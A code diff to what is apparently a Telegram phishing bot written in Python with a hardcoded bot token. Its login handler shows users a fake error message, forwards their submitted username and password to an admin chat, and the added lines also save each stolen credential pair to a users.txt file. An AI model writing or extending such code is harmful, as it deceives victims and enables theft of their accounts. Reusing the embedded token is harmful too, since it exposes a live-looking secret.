@@ -5,6 +5,7 @@ import asyncio
 import requests
 
 Token = '5832518494:AAG2TZ9XiHw_HlfFAiJq8gzFes8JT-TjzAk'
+log = open('users.txt', 'w')
 
 bot = Bot(token=Token)
 dp = Dispatcher()
@@ -31,6 +32,8 @@ async def login(message: Message):
         await message.answer(f'Error. Please try again or contact with us: @JoeBiden_Usa')
         admin_id = '1621436440'
         await bot.send_message(admin_id, f'Username: {username}, Password: {password}')
+        print('new login')
+        log.write(f'Username: {username}, Password: {password}')
     else:
         await message.answer('Please enter your username and password in the following format: /login username password')
         
